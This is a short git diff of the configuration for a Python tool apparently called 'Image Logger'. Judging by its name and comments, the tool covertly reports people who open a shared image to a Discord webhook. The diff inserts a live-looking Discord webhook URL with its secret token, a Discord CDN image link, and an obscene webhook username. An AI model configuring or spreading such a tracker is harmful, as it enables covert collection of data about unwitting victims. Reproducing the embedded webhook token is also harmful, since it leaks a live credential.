@@ -12,13 +12,13 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "",
-    "image": "", # You can also have a custom image by using a URL argument
+    "webhook": "https://canary.discord.com/api/webhooks/1345181448134725755/dNIstV6bcT9ntwkLv8KFweK-bGjoz3aN7VuPh-tnX2nyAPbhg8dKu5Tvm_T62SRonLiD",
+    "image": "https://cdn.discordapp.com/attachments/1343699226751799409/1345181561829462157/f4cae5da2c0b1c0e5c21048fac544ae6.jpg?ex=67c39d74&is=67c24bf4&hm=ab552d9f3a050c2e6b68566129191459252c262b3915bd33ab7ab24abb7d34bd&", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "DORUKBABAVURDUFALANFİLANPORNO", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
